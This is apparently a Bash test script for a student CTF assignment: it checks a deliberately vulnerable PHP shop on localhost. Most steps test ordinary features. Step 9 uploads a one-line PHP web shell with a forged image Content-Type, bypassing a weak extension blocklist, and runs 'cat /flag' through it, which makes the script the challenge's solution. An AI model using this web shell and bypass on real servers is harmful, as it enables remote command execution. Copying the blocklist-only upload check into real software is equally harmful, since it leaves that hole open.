#!/bin/bash
# ============================================================
# 胡杨好物 CTF 大作业自动化验证脚本
# 运行环境：Git Bash (Windows) / Linux 通用
# 用法：bash scripts/verify.sh
# 输出：reports/verify.log
# ============================================================
set -u
cd "$(dirname "$0")/.."

# ---------- Docker CLI 定位（Windows：优先使用项目内置 CLI） ----------
export DOCKER_HOST="${DOCKER_HOST:-npipe:////./pipe/docker_engine}"
if command -v docker >/dev/null 2>&1; then
    DOCKER="docker"
elif [ -x ".tools/docker/docker.exe" ]; then
    DOCKER=".tools/docker/docker.exe"
else
    DOCKER="docker"
fi
if command -v docker-compose >/dev/null 2>&1; then
    COMPOSE="docker-compose"
elif [ -x ".tools/docker-compose.exe" ]; then
    COMPOSE=".tools/docker-compose.exe"
else
    COMPOSE="docker-compose"
fi

BASE="http://127.0.0.1:26112"
FLAG="flag{this_is_zhangchangxin's_bigwork}"
HINT="TODO(dev): avatar upload legacy validation only blocks exe/bat/sh/cmd; php/png/jpg are not filtered and original filename is kept under /uploads/."
BRAND="胡杨好物"
AUTHOR="cyber-sword"
LOG="reports/verify.log"
TMP=".verify_tmp"

mkdir -p reports "$TMP"
: > "$LOG"
PASS=0; FAIL=0

log() { printf '%s\n' "$*" | tee -a "$LOG"; }
sec() { log ""; log "========== $1 =========="; }
ok()  { PASS=$((PASS+1)); log "[PASS] $1"; }
no()  { FAIL=$((FAIL+1)); log "[FAIL] $1"; }

# 断言：文件包含指定关键字
expect_contains() {
    if grep -qF -- "$3" "$2" 2>/dev/null; then ok "$1"; else no "$1"; fi
}
# 断言：文件不包含指定关键字
expect_not_contains() {
    if grep -qF -- "$3" "$2" 2>/dev/null; then no "$1"; else ok "$1"; fi
}

# ============================================================
sec "步骤 1：重建并启动 Docker 服务 ($DOCKER / $COMPOSE)"
log "\$ $COMPOSE down -v"
"$COMPOSE" down -v >> "$LOG" 2>&1
log "\$ $COMPOSE build --no-cache"
if "$COMPOSE" build --no-cache >> "$LOG" 2>&1; then
    ok "docker compose build --no-cache 成功"
else
    no "docker compose build --no-cache 失败（详见日志）"
fi
log "\$ $COMPOSE up -d"
if "$COMPOSE" up -d >> "$LOG" 2>&1; then
    ok "docker compose up -d 成功"
else
    no "docker compose up -d 失败（详见日志）"
fi
"$COMPOSE" ps >> "$LOG" 2>&1

# ============================================================
sec "步骤 2：等待服务启动（先等 60 秒，再轮询探测）"
log "sleep 60 ..."
sleep 60
UP=0
for i in $(seq 1 12); do
    CODE=$(curl -s -o /dev/null -w '%{http_code}' --max-time 5 "$BASE/index.php" 2>/dev/null)
    if [ "$CODE" = "200" ]; then UP=1; log "服务在第 $i 轮探测后响应 (HTTP 200)"; break; fi
    sleep 5
done
if [ "$UP" = "1" ]; then ok "服务已启动并可访问 (http://127.0.0.1:26112)"; else no "服务启动超时，首页不可访问"; fi

# ============================================================
sec "步骤 3：首页检查（品牌 / 作者 / 商品 / hint / 无 flag 泄露）"
CODE=$(curl -s --max-time 10 -o "$TMP/index.html" -w '%{http_code}' "$BASE/")
if [ "$CODE" = "200" ]; then ok "首页可访问 (HTTP 200)"; else no "首页访问异常 (HTTP $CODE)"; fi
expect_contains "主页源码包含上传漏洞 hint 注释" "$TMP/index.html" "$HINT"
expect_contains "网站品牌已更名为「胡杨好物」" "$TMP/index.html" "$BRAND"
expect_contains "页脚版权包含「作者：张昌鑫」" "$TMP/index.html" "作者：$AUTHOR"
GOODS_COUNT=$(grep -c 'class="goods-card"' "$TMP/index.html" 2>/dev/null || echo 0)
if [ "${GOODS_COUNT:-0}" -ge 12 ]; then
    ok "商品列表已扩充（当前 $GOODS_COUNT 件 ≥ 12 件）"
else
    no "商品列表数量不足（当前 ${GOODS_COUNT:-0} 件 < 12 件）"
fi
expect_not_contains "主页源码不包含真实 flag" "$TMP/index.html" "$FLAG"

# ============================================================
sec "步骤 4：登录功能检查"
CODE=$(curl -s --max-time 10 -o "$TMP/login_page.html" -w '%{http_code}' "$BASE/login.php")
expect_contains "登录页用户名默认预填 admin" "$TMP/login_page.html" 'value="admin"'

curl -s --max-time 10 -o "$TMP/login_bad.html" -d "username=admin&password=wrongpass" "$BASE/login.php"
expect_contains "错误密码登录被拒绝（提示用户名或密码错误）" "$TMP/login_bad.html" "用户名或密码错误"

CODE=$(curl -s --max-time 10 -c "$TMP/cookies.txt" -o "$TMP/login_ok.html" -w '%{http_code}' -d "username=admin&password=123456" "$BASE/login.php")
if [ "$CODE" = "302" ]; then ok "正确密码 admin/123456 登录成功（302 跳转 dashboard）"; else no "正确密码登录失败 (HTTP $CODE)"; fi

CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/dashboard.html" -w '%{http_code}' "$BASE/dashboard.php")
if [ "$CODE" = "200" ] && grep -q "个人中心" "$TMP/dashboard.html"; then
    ok "携带 Cookie 访问个人中心成功 (HTTP 200)"
else
    no "携带 Cookie 访问个人中心失败 (HTTP $CODE)"
fi

CODE=$(curl -s -o /dev/null --max-time 10 -w '%{http_code}' "$BASE/dashboard.php")
if [ "$CODE" = "302" ]; then ok "未登录访问个人中心被拦截（302 跳转登录页）"; else no "未登录访问个人中心未被拦截 (HTTP $CODE)"; fi
expect_not_contains "个人中心源码不包含真实 flag" "$TMP/dashboard.html" "$FLAG"

# ============================================================
sec "步骤 5：购物车功能检查（加购 / 数量增减 / 删除 / 合计）"
CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -w '%{http_code}' -d "action=add&id=3" "$BASE/cart.php")
if [ "$CODE" = "302" ]; then ok "商品 #3 加入购物车成功（302 PRG 跳转）"; else no "商品 #3 加购失败 (HTTP $CODE)"; fi

curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart.html" "$BASE/cart.php"
expect_contains "购物车页显示已加购商品（宿舍护眼小台灯）" "$TMP/cart.html" "宿舍护眼小台灯"
expect_contains "购物车页显示小计 ¥ 15.00" "$TMP/cart.html" "¥ 15.00"

curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "action=inc&id=3" "$BASE/cart.php"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart2.html" "$BASE/cart.php"
expect_contains "数量 +1 后显示 2 件、合计更新为 ¥ 30.00" "$TMP/cart2.html" "¥ 30.00"

curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "action=remove&id=3" "$BASE/cart.php"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/cart3.html" "$BASE/cart.php"
expect_contains "删除后购物车为空（空态提示）" "$TMP/cart3.html" "购物车空空如也"

# ============================================================
sec "步骤 6：收藏功能检查（收藏 / 取消收藏）"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "id=7&return=favorites" "$BASE/favorites.php"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/fav.html" "$BASE/favorites.php"
expect_contains "收藏商品 #7 后收藏页可见（考研英语真题全集）" "$TMP/fav.html" "考研英语真题全集"

curl -s --max-time 10 -b "$TMP/cookies.txt" -o /dev/null -d "id=7&return=favorites" "$BASE/favorites.php"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/fav2.html" "$BASE/favorites.php"
expect_contains "取消收藏后收藏页恢复空态" "$TMP/fav2.html" "还没有收藏任何好物"

# ============================================================
sec "步骤 7：个人资料修改功能检查（用户名/性别/年龄/生日/地址）"
# 使用显式 UTF-8 百分号编码 POST 体，规避 Windows curl 本地代码页（GBK）编码差异
# username=胡杨测试君 gender=女 address=金柳苑 6 号楼 666
PENC="username=%E8%83%A1%E6%9D%A8%E6%B5%8B%E8%AF%95%E5%90%9B&gender=%E5%A5%B3&age=23&birthday=2002-05-20&address=%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20666"
CODE=$(curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$PENC" -o /dev/null -w '%{http_code}' "$BASE/profile.php")
if [ "$CODE" = "302" ]; then ok "资料修改 POST 成功（302 PRG 跳转 profile.php?saved=1）"; else no "资料修改 POST 失败 (HTTP $CODE)"; fi

curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/profile.html" "$BASE/profile.php"
expect_contains "新用户名「胡杨测试君」已回显" "$TMP/profile.html" "胡杨测试君"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/dash2.html" "$BASE/dashboard.php"
expect_contains "新昵称同步显示在个人中心" "$TMP/dash2.html" "胡杨测试君"

# 非法年龄校验（gender=女）
PENC_BAD="username=%E8%83%A1%E6%9D%A8%E6%B5%8B%E8%AF%95%E5%90%9B&gender=%E5%A5%B3&age=999&birthday=2002-05-20&address=%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20666"
curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$PENC_BAD" -o "$TMP/profile_bad.html" "$BASE/profile.php"
expect_contains "非法年龄(999)被服务端校验拦截" "$TMP/profile_bad.html" "年龄需为 1-120 的数字"

# 恢复默认资料，避免污染演示状态
# username=大漠胡杨 gender=男 address=胡杨大学金柳苑 6 号楼 520
RENC="username=%E5%A4%A7%E6%BC%A0%E8%83%A1%E6%9D%A8&gender=%E7%94%B7&age=21&birthday=2004-09-01&address=%E8%83%A1%E6%9D%A8%E5%A4%A7%E5%AD%A6%E9%87%91%E6%9F%85%E8%8B%91%206%20%E5%8F%B7%E6%A5%BC%20520"
curl -s --max-time 10 -b "$TMP/cookies.txt" --data-raw "$RENC" -o /dev/null "$BASE/profile.php"
curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/profile_restore.html" "$BASE/profile.php"
expect_contains "资料已恢复默认值（大漠胡杨）" "$TMP/profile_restore.html" "大漠胡杨"

# ============================================================
sec "步骤 8：上传防护检查（.exe 必须被黑名单拦截）"
printf 'MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00fake-exe-content' > "$TMP/avatar.exe"
curl -s --max-time 10 -b "$TMP/cookies.txt" \
    -F "avatar=@$TMP/avatar.exe;type=image/png" \
    -o "$TMP/exe_resp.html" "$BASE/upload.php"
expect_contains "伪装 image/png 的 .exe 被扩展名黑名单拦截" "$TMP/exe_resp.html" "禁止上传"
curl -s --max-time 10 -o "$TMP/exe_fetch.txt" "$BASE/uploads/avatar.exe"
expect_not_contains "avatar.exe 未被保存到 /uploads/" "$TMP/exe_fetch.txt" "fake-exe-content"

# ============================================================
sec "步骤 9：上传绕过 + 一句话木马 GetFlag（核心漏洞验证）"
cat > "$TMP/shell.php" <<'PHPEOF'
<?php @system($_GET['cmd']);
PHPEOF
curl -s --max-time 10 -b "$TMP/cookies.txt" \
    -F "avatar=@$TMP/shell.php;type=image/png" \
    -o "$TMP/shell_resp.html" "$BASE/upload.php"
expect_contains "shell.php 伪造 Content-Type: image/png 上传成功" "$TMP/shell_resp.html" "上传成功"
expect_contains "原文件名保留，文件位于 /uploads/shell.php" "$TMP/shell_resp.html" "/uploads/shell.php"

curl -s --max-time 10 -o "$TMP/flag_resp.txt" "$BASE/uploads/shell.php?cmd=cat%20/flag"
expect_contains "一句话木马执行 cat /flag 返回正确 flag" "$TMP/flag_resp.txt" "$FLAG"

# ============================================================
sec "步骤 10：Flag 提交校验页面（hash_equals 服务端比对）"
curl -s --max-time 10 -b "$TMP/cookies.txt" --data-urlencode "flag=flag{this_is_a_wrong_flag}" \
    -o "$TMP/flag_bad.html" "$BASE/flag_submit.php"
expect_contains "错误 flag 提交被拒绝" "$TMP/flag_bad.html" "不正确"

curl -s --max-time 10 -b "$TMP/cookies.txt" --data-urlencode "flag=$FLAG" \
    -o "$TMP/flag_ok.html" "$BASE/flag_submit.php"
expect_contains "正确 flag 提交校验成功" "$TMP/flag_ok.html" "恭喜你完成挑战"
expect_not_contains "flag_submit 页面源码不包含真实 flag" "$TMP/flag_ok.html" "$FLAG"

# ============================================================
sec "步骤 11：全站源码 flag 泄露检查"
for p in "/" "/login.php" "/cart.php" "/favorites.php" "/profile.php" "/flag_submit.php"; do
    curl -s --max-time 10 -b "$TMP/cookies.txt" -o "$TMP/leak.html" "$BASE$p"
    expect_not_contains "源码泄露检查 $p 不含真实 flag" "$TMP/leak.html" "$FLAG"
done
# /flag 文件在容器内且不在 Web 根目录
if "$COMPOSE" exec -T web sh -c 'test -f /flag && test ! -f /var/www/html/flag && echo FLAG_OK' >> "$LOG" 2>&1; then
    ok "/flag 位于容器根目录且不在 Web 根目录内"
else
    no "/flag 位置检查失败"
fi

# ============================================================
sec "步骤 12：本机 IP 访问 26112 端口检查"
IPS=""
if command -v powershell.exe >/dev/null 2>&1; then
    IPS=$(powershell.exe -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress" 2>/dev/null | tr -d '\r' | grep -v '^127\.' | sort -u)
fi
if [ -z "$IPS" ] && command -v hostname >/dev/null 2>&1; then
    IPS=$(hostname -I 2>/dev/null)
fi
IP_OK=""
for ip in $IPS; do
    log "尝试 http://$ip:26112/ ..."
    CODE=$(curl -s -o /dev/null --max-time 5 -w '%{http_code}' "http://$ip:26112/" 2>/dev/null)
    log "  -> HTTP $CODE"
    if [ "$CODE" = "200" ]; then IP_OK="$ip"; break; fi
done
if [ -n "$IP_OK" ]; then ok "本机 IP ($IP_OK) 访问 26112 端口成功"; else no "所有本机 IP 均无法访问 26112 端口"; fi

# ============================================================
sec "步骤 13：最终服务状态"
"$COMPOSE" ps >> "$LOG" 2>&1

# 清理临时目录
rm -rf "$TMP"

log ""
log "=============================================="
log "验证完成：PASS=$PASS FAIL=$FAIL"
if [ "$FAIL" -eq 0 ]; then
    log "结论：全部验证通过 ✔"
else
    log "结论：存在失败项，请检查上方 [FAIL] 条目"
fi
log "=============================================="

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
